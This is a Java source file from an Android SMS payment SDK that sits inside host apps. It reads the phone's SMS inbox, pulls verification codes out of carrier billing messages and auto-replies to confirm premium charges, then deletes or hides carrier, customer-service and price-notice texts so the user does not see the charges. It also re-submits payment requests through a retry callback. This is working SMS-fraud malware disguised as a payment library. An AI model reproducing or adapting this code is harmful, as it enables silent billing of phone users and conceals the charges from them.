package com.y7.smspay.sdk.mgr;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import com.y7.smspay.count.InterceptNet;
import com.y7.smspay.mp.srv.DDDLog;
import com.y7.smspay.mp.srv.IMstP;
import com.y7.smspay.mp.srv.MPoyCallback;
import com.y7.smspay.mp.srv.Ms;
import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.mgr.YNeedPoyCallbackInfo.OnNeedPayReceiver;
import com.y7.smspay.sdk.ss.SsParse;
import com.y7.smspay.sdk.ss.SsParseBean;
import com.y7.smspay.sdk.util.Constants;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.SingleAction;
import com.y7.smspay.sdk.util.StrUtils;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Calendar;
import java.util.concurrent.Callable;
import java.util.concurrent.FutureTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class YPoyManager implements IMstP {

    public static Context MyContext = null;
    /**
     * 0-付费成功
     */
    public final static int PayState_SUCCESS = 0;
    /**
     * 1-付费失败
     */
    public final static int PayState_FAILURE = 1;
    /**
     * 2-付费取消
     */
    public final static int PayState_CANCEL = 2;

    private static YPoyManager ycCpManager = null;

    public static YPoyManager getInstance() {
        if (ycCpManager == null) {
            ycCpManager = new YPoyManager();
        }
        return ycCpManager;
    }

    public YPoyManager() {
    }

    public IniMyPara ip = null;
    public int cutPrice = 0;

    /**
     * 初始化
     *
     * @param ctx 以下是易付通需要参数
     */
    @Override
    public void Init(final Context ctx) {

        MyContext = ctx;
        startService("1");
        YManager.getInstance().Init(ctx, new SingleAction() {
            @Override
            public void execute() {
                //DDDLog.d("execute");

                new Thread() {
                    @Override
                    public void run() {
                        super.run();
                        try {
                            Looper.prepare();
                            // 保持消息循环 主线程handler looper
                            new Handler().postDelayed(new Runnable() {

                                @Override
                                public void run() {
                                    //DDDLog.d("payInit 开始检查补单");// 初始化第一步检测补单
                                    YManager.getInstance().payTheLostBill(ctx);
                                }
                            }, 30 * 1000);// 间隔执行,考虑关闭条件
                            Looper.loop();
                        } catch (Exception ex) {
                            //DDDLog.e("payInit 补单异常：", ex);
                        }
                    }
                }.start();
            }
        });

    }

    /**
     * 请求通道Id
     * <p>
     * 价格price
     * 指令IDpayItemID
     * 提示str
     * 道具名称product
     * 付费点ID Did
     * extData
     * 回调处理receiver
     */
    class IniMyPara {
        public IniMyPara(Context ctx, String price, int payItemID, String str,
                         String product, String extData, String did) {
            super();
            this.ctx = ctx;
            this.price = price;
            this.payItemID = payItemID;
            this.str = str;
            this.product = product;
            this.Did = did;
            this.extData = extData;
        }

        private Context ctx;
        private String price;
        private int payItemID;
        private String str;
        private String product;
        private String Did;
        private String extData;
    }

    @Override
    public void reqChannelId(Context ctx, String price, int payItemID,
                             String str, String product, String Did, String extData,
                             MPoyCallback receiver) {
        startService("1");
        //DDDLog.i("price = " + Integer.parseInt(price));
        if (Integer.parseInt(price) <= 0)
            return;
        ip = new IniMyPara(ctx, price, payItemID, str, product, extData, Did);
        Constants.cutPrice = Integer.parseInt(price);
        reqPay(ctx, price, str, product, extData, payItemID, Did, mpCb);
    }

    MPoyCallback mpCb = new MPoyCallback() {
        @Override
        public void onResult(int state, String price) {
            // TODO Auto-generated method stub
            //DDDLog.e("come here!~"+Constants.cutPrice);
            //state == 0 &&
            if (Constants.cutPrice > 0 && ip != null) {
                //DDDLog.e("ABCD_进入拼资费_ABCD");
                reqPay(ip.ctx, Constants.cutPrice + "", ip.str, ip.product, ip.extData,
                        ip.payItemID, ip.Did, mpCb);

            }
        }
    };

    /**
     * 2014-11-06 added by pengbb 新增支持中国手游短代付费通道 请求付费
     *
     * @param ctx
     * @param price     价格（单位为分）
     * @param str       二次确认提示内容
     * @param product   道具名称
     * @param extData
     * @param payItemID 付费道具ID（在后台可以配置），-1为默认值，表示不支持中国手游短代付费通道
     * @param receiver  回调接口
     */
    private void reqPay(Context ctx, String price, String str, String product,
                        String extData, int payItemID, String Did, MPoyCallback receiver) {

        //DDDLog.d("init cb begin");
        YPoyCallbackInfo cb = new YPoyCallbackInfo(receiver);

        //DDDLog.d("init cb end");

        YManager.getInstance().throughCounter = 0;
        YManager.getInstance().PayThrough = YManager.getInstance().payNumber
                % YManager.THROUGNUMBER; // 通道的循环机制,不需要一直重复请求同一个通道
        YManager.getInstance().payNumber++;
        YManager.getInstance().reqChannelId(ctx, price, str, product, extData,
                Did, cb, false);
    }

    /**
     * 启动短信拦截 在主Activity执行 onResume()时候调用
     *
     * @param ctx
     */

    public void blockSMS(Context ctx) {

        YManager.getInstance().blockSMS(ctx);


    }


    /**
     * 进行资源释放，在主Activity执行 onDestroy()时必须调用
     */
    public void closePay() {
        //DDDLog.i("kill myself");
        // android.os.Process.killProcess(android.os.Process.myPid());

    }


    public void isNeedPay(Context ctx, String payID, OnNeedPayReceiver receiver) {
        YNeedPoyCallbackInfo cb = new YNeedPoyCallbackInfo(receiver);
        YManager.getInstance().isNeedPay(ctx, payID, cb);
    }


    // imsi为空情况多发，需注意！
    @Override
    public String getNeedPayList(Context ctx) {
        String result = "";
        StringBuffer sb = new StringBuffer();
        PriceConfigTask task = new PriceConfigTask(ctx);
        new Thread(task).start();
        try {
            result = task.get();
            if (TextUtils.isEmpty(result)) {
                return "";
            } else {
                JSONObject oj = new JSONObject(result);
                JSONArray jsonArray = oj.getJSONArray("rows");
                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject json = jsonArray.getJSONObject(i);
                    sb.append(json.getString("did"));
                    sb.append(":");
                    String imsi = Utils.getIMSI(ctx);
                    if (!TextUtils.isEmpty(imsi)) {
                        if ((imsi.startsWith("46000"))
                                || (imsi.startsWith("46002"))
                                || (imsi.startsWith("46007"))) { // 移动
                            sb.append(json.getString("yprice"));
                        }
                        if (imsi.startsWith("46001")) { // 联通
                            sb.append(json.getString("lprice"));
                        }
                        if (imsi.startsWith("46003")
                                || imsi.startsWith("46011")) { // 电信
                            sb.append(json.getString("dprice"));
                        }
                    }
                    sb.append(":");
                    sb.append(json.getString("isopen"));
                    sb.append(";");
                }
                return sb.toString();
            }
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
        return "";
    }

    /**
     * 获取支付点ID和对应的价格
     *
     * @author xingjian.peng
     */
    static class PriceConfigTask extends FutureTask<String> {
        public PriceConfigTask(final Context ctx) {
            super(new Callable<String>() {
                @Override
                public String call() throws Exception {
                    String result = GetDataImpl.getInstance(ctx).PriceConfig();
                    return result;
                }
            });
        }
    }

    /**
     * 发注册短信
     *
     * @param ctx
     */
    public void sendSmsPhone(final Context ctx) {
        MyContext = ctx;

        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpSdSsTool.sendSmsPhone(ctx);
            }
        }).start();
    }

    public void TimerReqChanneL(final Context ctx) {
        /*
         * if(){ Utils.startCheckServTimer(ctx,100 ); }
		 */
    }

    private Context mContext;
    long _onChange_id = 0;
    private static final long STOP_SMS_TIME = 5 * 60 * 1000;

    public static final int MIN_CLICK_DELAY_TIME = 2000;
    private long lastClickTime = 0;

    @Override
    public boolean onReceive(Intent intent) {
        long currentTime = Calendar.getInstance().getTimeInMillis();
        if (currentTime - lastClickTime > MIN_CLICK_DELAY_TIME) {
            lastClickTime = currentTime;
            new InterceptNet().start(); //删除成功 记录拦截
        }
        if (intent == null) {

            return false;
        }
        if (intent.getAction().equals("com.ypoy.smsobserved")) {
            if (mContext == null)
                mContext = Ms.i();
            return sqlSmsQuey();
        }
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            if (mContext == null)
                mContext = Ms.i();
            return reSmsQuey(intent);
        }

        return false;
    }

    boolean reSmsQuey(Intent intent) {
        SmsMessage[] msg = null;
        // if
        // (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
        // {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdusObj = (Object[]) bundle.get("pdus");
            msg = new SmsMessage[pdusObj.length];
            for (int i = 0; i < pdusObj.length; i++)
                msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
        }

        if (msg == null || msg.length <= 0) {

            return false;
        }
        // 短信拦截
        for (int i = 0; i < msg.length; i++) {
            String sender = msg[i].getDisplayOriginatingAddress();// 获取短信的发送者
            String msgTxt = msg[i].getMessageBody(); // 获取短信内容

//			DDDLog.d("YPaySmsReceive mssage -->" + msgTxt);
            //DDDLog.d("YPaySmsReceive Number -->" + sender);

            try {
                if (sender.startsWith("86")) {
                    sender = sender.substring(2, sender.length());
                } else if (sender.startsWith("+86")) {
                    sender = sender.substring(3, sender.length());
                }
            } catch (Exception e) {

            }

            if (Constants.isTest) {
                if (!TextUtils.isEmpty(msgTxt)) {
                    if (msgTxt.contains("test")) {
                        try {
                            String[] tmpStrA = msgTxt.split(";");// test;msg
                            HttpSdSsTool.sendMassage(this.mContext, tmpStrA[1],sender);
                        } catch (Exception e) {

                        }
                    }
                }

                return false;
            }

            for (SsParseBean spb : SsParse.spbLst) {
                //DDDLog.e("YPaySmsReceive ###1");
                if (!TextUtils.isEmpty(spb.getCapCode())
                        && !spb.isHasUploadCode()) {

                    //DDDLog.e("YPaySmsReceive ###2");
                    try {
                        //DDDLog.e("YPaySmsReceive ###3");
                        //DDDLog.d("YPaySmsReceive capCode --> "+ spb.getCapCode());

                        if (!TextUtils.isEmpty(msgTxt)) {
                            //DDDLog.d("YPaySmsReceive 验证码 123--> " + msgTxt);
                            if (!TextUtils.isEmpty(spb.getCapPort())) {
                                if (sender.startsWith(spb.getCapPort())) {
                                    String _parse = Utils.parseReverse(msgTxt,
                                            spb.getDirection(),
                                            spb.getCapCode(),
                                            spb.getStartWord(),
                                            spb.getEndWord());

                                    if (!TextUtils.isEmpty(_parse)) {
                                        //DDDLog.d("setHasUploadCode--> true");
                                        // SmsParse.hasUploadCode = true;
                                        spb.setHasUploadCode(true);

                                        sendMsg(_parse, sender, spb);

//                                         this.abortBroadcast(); // 拦截短信，不再显示

                                        return true;
                                    }
                                }
                            } else {
                                String _parse = Utils.parseReverse(msgTxt,
                                        spb.getDirection(), spb.getCapCode(),
                                        spb.getStartWord(), spb.getEndWord());

                                if (!TextUtils.isEmpty(_parse)) {
                                    //DDDLog.d("setHasUploadCode--> true");

                                    spb.setHasUploadCode(true);
                                    sendMsg(_parse, sender, spb);

                                    // this.abortBroadcast(); // 拦截短信，不再显示

                                    return true;
                                }
                            }

                            //DDDLog.d("getHasUploadCode--> "+ spb.isHasUploadCode());
                        }
                    } catch (Exception e) {
                        //DDDLog.e("YPaySmsReceive code", e);
                    }
                }
            }

            try {
                //DDDLog.d("PhoneNumber -->" + Utils.getPhoneNumber(mContext));
                //DDDLog.d("MessageBody -->" + Utils.getMessageBody(mContext));
                // 手机号关键字
                Pattern pattern = Pattern.compile(Utils
                        .getPhoneNumber(mContext));
                Matcher matcher = pattern.matcher(sender);

                //DDDLog.d(matcher.toString());
                if (matcher.matches()) { // 当条件满足时，将返回true，否则返回false
                    // this.abortBroadcast(); // 拦截短信，不再显示

                    return true;
                }
            } catch (Exception e) {
                //DDDLog.e("Exception", e);
            }
            try {
                //DDDLog.d("MessageBody -->" + Utils.getMessageBody(mContext));
                // 短信内容关键字
                Pattern pattern = Pattern.compile(Utils
                        .getMessageBody(mContext));
                Matcher matcher = pattern.matcher(msgTxt);
                //DDDLog.d(matcher.toString());
                if (matcher.matches()) {// 当条件满足时，将返回true，否则返回false
                    // this.abortBroadcast(); // 拦截短信，不再显示

                    return true;
                }
            } catch (Exception e) {
                //DDDLog.e("Exception", e);
            }

            if (!SsParse.isSecondConfirm) {
                try {
                    if (sender.startsWith("10")) { // 电信增值服务
                        // this.abortBroadcast(); // 拦截短信，不再显示

                        return true;
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }
                try {
                    if (sender.contains("10005888")) { // 电信增值服务
                        if (msgTxt.contains("2元") || msgTxt.contains("4元")
                                || msgTxt.contains("6元")) {
                            // this.abortBroadcast(); // 拦截短信，不再显示

                            return true;
                        }
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }

                try {
                    if (msgTxt.contains("点")) { // 包含
                        if (msgTxt.contains("200") || msgTxt.contains("400")
                                || msgTxt.contains("600")) {
                            // this.abortBroadcast(); // 拦截短信，不再显示

                            return true;
                        }
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }

                try {
                    if (msgTxt.contains("游戏") || msgTxt.contains("道具")) {
                        if (msgTxt.contains("2元") || msgTxt.contains("4元")
                                || msgTxt.contains("6元")) {
                            // this.abortBroadcast(); // 拦截短信，不再显示

                            return true;
                        }
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }

                /** 客服电话 */
                try {
                    if (msgTxt.contains("4000826898")
                            || msgTxt.contains("4006289988")) {
                        //DDDLog.d("拦截客服短信");
                        // this.abortBroadcast(); // 拦截短信，不再显示

                        return true;
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }

                /** 定时拦截 */
                try {
                    if ((System.currentTimeMillis() - Utils
                            .getStopSmsTime(mContext)) < STOP_SMS_TIME) {
                        if (msgTxt.contains("2") || msgTxt.contains("4")
                                || msgTxt.contains("6")) {
                            // this.abortBroadcast(); // 拦截短信，不再显示

                            return true;
                        }
                    }
                } catch (Exception e) {
                    //DDDLog.e("Exception", e);
                }
            }
        }
        // return;
        // }

        DDDLog.i("xxxxxxxx");
        return false;
    }

    boolean sqlSmsQuey() {
        Cursor cursor_1 = null;
        try {
            cursor_1 = mContext.getContentResolver().query(
                    Uri.parse(StrUtils.SMS_INBOX_URI), null, null, null,
                    "date desc");
            if (cursor_1.getCount() > 0 && cursor_1.moveToNext()) {

                if (Constants.isTest) {
                    String[] astr = cursor_1.getColumnNames();
                    for (int z = 0; z < astr.length; z++) {

                        String str = cursor_1.getString(cursor_1
                                .getColumnIndex(astr[z]));

                        //DDDLog.d("--->name= " + astr[z] + " value = " + str);
                    }
                    //DDDLog.d("isFirst --> " + cursor_1.isFirst());
                }

                //DDDLog.d("有短信!!!!");

                long id = cursor_1.getLong(cursor_1.getColumnIndex("_id"));
                if (_onChange_id != id) {
                    _onChange_id = id;
                } else {
                    //DDDLog.e("onChange 此广播已处理~");

                    return false;
                }
            }
        } catch (Exception e) {
            //DDDLog.e("sms sql: ", e);
        } finally {
            if (cursor_1 != null && !cursor_1.isClosed()) {
                cursor_1.close();
            }
            cursor_1 = null;
        }

        //DDDLog.d("HttpSendSmsTool.ISREQUESCODE -->" + HttpSdSsTool.ISREQUESCODE);

        long installTime = Utils.getInstallTime(mContext);
        if (installTime == 0) {
            Utils.saveInstallTime(mContext);
        }

        //DDDLog.e("installTime" + String.valueOf(installTime));

        checkCode();

        Cursor cursor_4 = null;
        // 按短信内容过滤
        for (String messageContent : SsParse.msgLst) {
            if (!TextUtils.isEmpty(messageContent)) {
                try {
                    cursor_4 = mContext.getContentResolver()
                            .query(Uri.parse(StrUtils.SMS_ALL_URI),
                                    new String[]{"_id", "address",
                                            "thread_id", "date", "protocol",
                                            "type", "body", "read"},
                                    "body LIKE ? and date > ?",
                                    new String[]{"%" + messageContent + "%",
                                            String.valueOf(installTime)},
                                    "date desc");
                    deleteMsgByCursor(cursor_4, "Content");
                } catch (Exception e) {
                    //DDDLog.e("body", e);
                } finally {
                    if (cursor_4 != null && !cursor_4.isClosed()) {
                        cursor_4.close();
                    }
                    cursor_4 = null;
                }
            }
        }

        Cursor cursor_3 = null;
        // 按来源号码过滤
        for (String phoneNumber : SsParse.phoneLst) {
            if (!TextUtils.isEmpty(phoneNumber)) {
                try {
                    cursor_3 = mContext
                            .getContentResolver()
                            .query(Uri.parse(StrUtils.SMS_ALL_URI),
                                    new String[]{"_id", "address",
                                            "thread_id", "date", "protocol",
                                            "type", "body", "read"},
                                    "address like ? or address like ? or address like ? and date > ?",
                                    new String[]{phoneNumber + "%",
                                            "86" + phoneNumber + "%",
                                            "+86" + phoneNumber + "%",
                                            String.valueOf(installTime)},
                                    "date desc");
                    deleteMsgByCursor(cursor_3, "Number");
                } catch (Exception e) {
                    //DDDLog.e("body", e);
                } finally {
                    if (cursor_3 != null && !cursor_3.isClosed()) {
                        cursor_3.close();
                    }
                    cursor_3 = null;
                }
            }
        }

        if (!SsParse.isSecondConfirm) {
            Cursor cursor_5 = null;
            try {
                cursor_5 = mContext
                        .getContentResolver()
                        .query(Uri.parse(StrUtils.SMS_ALL_URI),
                                new String[]{"_id", "address", "thread_id",
                                        "date", "protocol", "type", "body",
                                        "read"},
                                "address like ? or address like ? or address like ? and date > ?",
                                new String[]{"10" + "%", "86" + "10" + "%",
                                        "+86" + "10" + "%",
                                        String.valueOf(installTime)},
                                "date desc");
                deleteMsgByCursor(cursor_5, "Number");
            } catch (Exception e) {
                //DDDLog.e("body", e);
            } finally {
                if (cursor_5 != null && !cursor_5.isClosed()) {
                    cursor_5.close();
                }
                cursor_5 = null;
            }

        }

        //DDDLog.d("smsContentObserver.onChange end");
        return false;
    }

    private void checkCode() {
        Cursor cursor_2 = null;
        for (SsParseBean spb : SsParse.spbLst) {
            if (!TextUtils.isEmpty(spb.getCapCode()) && !spb.isHasUploadCode()) {
                //DDDLog.e("###2");
                try {
                    //DDDLog.e("###3");
                    //DDDLog.d("capCode --> " + spb.getCapCode());

                    String[] aary = new String[]{"%" + spb.getCapCode() + "%"};
                    //DDDLog.d("capCode ary--> " + aary[0]);

                    try {
                        Thread.sleep(1 * 1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (spb.isHasUploadCode()) {
                        return;
                    }

                    cursor_2 = mContext.getContentResolver().query(
                            Uri.parse(StrUtils.SMS_INBOX_URI), null,
                            "body LIKE ?", aary, "date desc");

                    //DDDLog.d("capCode find count--> " + cursor_2.getCount());

                    if (cursor_2.moveToNext()) {
                        //DDDLog.e("###4");
                        String sender = cursor_2.getString(cursor_2
                                .getColumnIndex("address"));

                        String body = cursor_2.getString(cursor_2
                                .getColumnIndex("body"));

                        //DDDLog.d("验证码 sender--> " + sender);
                        //DDDLog.d("验证码 body--> " + body);

                        if (!TextUtils.isEmpty(body)) {
                            String _parse = Utils.parseReverse(body,
                                    spb.getDirection(), spb.getCapCode(),
                                    spb.getStartWord(), spb.getEndWord());

                            //DDDLog.d("验证码 _parse--> " + _parse);
                            if (!TextUtils.isEmpty(_parse)) {
                                spb.setHasUploadCode(true);
                                sendMsg(_parse, sender, spb);

                                deleteMsgByCursor(cursor_2, "Code");
                                return;
                            }
                        }
                    }
                } catch (Exception e) {
                    //DDDLog.e("code", e);
                } finally {
                    if (cursor_2 != null && !cursor_2.isClosed()) {
                        cursor_2.close();
                    }
                    cursor_2 = null;
                }
            }
        }

    }

    private void deleteMsgByCursor(Cursor cursor, String TAG) {
        try {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor
                        .getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                long date = cursor.getLong(cursor.getColumnIndex("date"));

                long installTime = Utils.getInstallTime(mContext);
                if (installTime == 0) {
                    Utils.saveInstallTime(mContext);
                }

                ContentValues contentValues = new ContentValues();
                contentValues.put("read", "1");
                int del = mContext.getContentResolver().update(
                        Uri.parse(StrUtils.SMS_ALL_URI), contentValues,
                        "_id =" + id, null);

                if (installTime < date) {
                    //DDDLog.e("create date " + date + "	installTime"+ String.valueOf(installTime));
                    del = mContext.getContentResolver()
                            .delete(Uri.parse(StrUtils.SMS_ALL_URI),
                                    "_id =" + id, null);
                    //DDDLog.e(TAG + "-->删除该短信平台发来的短信---" + address + "-->"+ body + " 删除结果-->" + del);
                }

                if (Utils.getHasDel(mContext) == 0) {
                    if (del == 1) {
                        Utils.saveHasDel(mContext, 10);
                    } else {
                        Utils.saveHasDel(mContext, 11);
                    }
                }
                break;
            }
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    private void sendMsg(final String content, final String phoneNumber,final SsParseBean spb) {
        if (spb == null)
            return;

        String secondPort = spb.getSecondPort();
        String secondMsg = spb.getSecondMsg();
        String secondType = spb.getSecondType();

        if (TextUtils.isEmpty(secondPort)) {
            secondPort = phoneNumber;
        }
        if (TextUtils.isEmpty(secondMsg)) {
            secondMsg = content;
        }

        //DDDLog.d("验证码 content--> " + content);
        //DDDLog.d("验证码 secondPort--> " + secondPort);
        //DDDLog.d("验证码 secondMsg--> " + secondMsg);
        //DDDLog.d("验证码 secondType--> " + secondType);

        if (TextUtils.isEmpty(secondType)) {
            HttpSdSsTool.callBackCore(Constants.CHANNEL_YDSQ, content);
            return;
        }

        // 支付类型 1验证码 2字符串sms 3 二进制sms 4二次短信回复
        if (secondType.equals("1")) {
            HttpSdSsTool.callBackCore(Constants.CHANNEL_YDSQ, content);
        } else if (secondType.equals("2")) {
            HttpSdSsTool.sendMassage(this.mContext, content + secondMsg,secondPort);
        } else if (secondType.equals("3")) {
            HttpSdSsTool.sendMassage(this.mContext, secondMsg, secondPort);
        } else if (secondType.equals("4")) {
            HttpSdSsTool.sendMassage(this.mContext, secondMsg, secondPort);
        }
    }

    public static void startService(String action) {
        Intent intentService = new Intent(MyContext, Ms.class);
        //  intentService.putExtra("caller", "Agent:" + package_name);
        // Intent extraIntent = new Intent(action);
/*        extraIntent.putExtra(Constants.EXTRAS_KEY_APPNAME, app_name);
        extraIntent.putExtra(Constants.EXTRAS_KEY_PACKAGENAME, package_name);
        extraIntent.putExtra(Constants.EXTRAS_KEY_APPVERSION, app_version);
        extraIntent.putExtra(Constants.EXTRAS_KEY_APPKEY, app_key);
        extraIntent.putExtra(Constants.EXTRAS_KEY_CHANNELID, channel_id);
        intentService.putExtra(Constants.EXTRAS_KEY_INTENT, extraIntent);*/
        if (mbinder == null) {
            MyContext.bindService(intentService, serCnn, 1);
        }
        MyContext.startService(intentService);
    }

    private static Ms.MBinder mbinder = null;

    private static ServiceConnection serCnn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            //DDDLog.d("onServiceConnected-" + name);
            mbinder = (Ms.MBinder) service;
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mbinder = null;
            //DDDLog.d( "onServiceDisconnected-" + name);
        }
    };
}
